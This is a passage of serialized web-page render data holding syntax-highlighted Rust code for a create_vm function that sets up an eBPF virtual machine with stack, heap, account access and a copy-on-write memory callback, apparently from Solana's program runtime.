token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"create_vm\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'b\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Result\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"EbpfVm\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RequisiteVerifier\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"InvokeContext\"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'b\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Box\"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"dyn\"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"std\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"error\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Error\"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" stack_size \"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" stack\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"len\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" heap_size \"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" heap\"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"len\"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" accounts \"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Arc\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"invoke_context\"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"transaction_context\"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" memory_mapping \"]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"create_memory_mapping\"]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement105\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        regions\"]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement110\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// this is the cow_cb\"]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement114\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Box\"]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement118\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"new\"]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"move\"]}],[\"$\",\"span\",\"code-segement121\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement122\",{\"className\":\"token token closure-params closure-punctuation\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"|\"]}],[\"$\",\"span\",\"code-segement123\",{\"className\":\"token token closure-params\",\"style\":{},\"children\":[\"index_in_transaction\"]}],[\"$\",\"span\",\"code-segement124\",{\"className\":\"token token closure-params closure-punctuation\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"|\"]}],[\"$\",\"span\",\"code-segement125\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement126\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement127\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement130\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// The two calls below can't really fail. If they fail because of a bug,\"]}],[\"$\",\"span\",\"code-segement131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement133\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement134\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// whatever is writing will trigger an EbpfError::AccessViolation like\"]}],[\"$\",\"span\",\"code-segement135\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[12]}],[\"$\",\"span\",\"code-segement137\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement138\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// if the region was readonly, and the transaction will fail gracefully.\"]}],[\"$\",\"span\",\"code-segement139\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[13]}],[\"$\",\"span\",\"code-segement141\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement142\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement143\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement144\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement145\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" account \"]}],[\"$\",\"span\",\"code-segement146\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement147\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" accounts\\n\"]}],[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement149\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement150\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement151\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"try_borrow_mut\"]}],[\"$\",\"span\",\"code-segement152\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement153\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"index_in_transaction \"]}],[\"$\",\"span\",\"code-segement154\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement155\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement156\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"IndexOfAccount\"]}],[\"$\",\"span\",\"code-segement157\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement158\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[15]}],[\"$\",\"span\",\"code-segement160\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement161\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement162\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"map_err\"]}],[\"$\",\"span\",\"code-segement163\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement164\",{\"className\":\"token token closure-params closure-punctuation\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"|\"]}],[\"$\",\"span\",\"code-segement165\",{\"className\":\"token token closure-params\",\"style\":{},\"children\":[\"_\"]}],[\"$\",\"span\",\"code-segement166\",{\"className\":\"token token closure-params closure-punctuation\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"|\"]}],[\"$\",\"span\",\"code-segement167\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement168\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement169\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement170\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement171\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segement172\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement173\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[16]}],\"            accounts\\n\",[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[17]}],[\"$\",\"span\",\"code-segement177\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement178\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement179\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"touch\"]}],[\"$\",\"span\",\"code-segement180\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement181\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"index_in_transaction \"]}],[\"$\",\"span\",\"code-segement182\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement183\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement184\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"IndexOfAccount\"]}],[\"$\",\"span\",\"code-segement185\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement186\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[18]}],[\"$\",\"span\",\"code-segement188\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement189\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement190\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"map_err\"]}],[\"$\",\"span\",\"code-segement191\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement192\",{\"className\":\"token token closure-params closure-punctuation\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"|\"]}],[\"$\",\"span\",\"code-segement193\",{\"className\":\"token token closure-params\",\"style\":{},\"children\":[\"_\"]}],[\"$\",\"span\",\"code-segement194\",{\"className\":\"token token closure-params closure-punctuation\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"|\"]}],[\"$\",\"span\",\"code-segement195\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement196\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement197\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement198\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement199\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segement200\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement201\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[19]}],\"\\n\",[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[20]}],[\"$\",\"span\",\"code-segement205\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement206\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement207\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" account\"]}],[\"$\",\"span\",\"code-segement208\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement209\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"is_shared\"]}],[\"$\",\"span\",\"code-segement210\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement211\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement212\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement213\",{\"className\":\"token 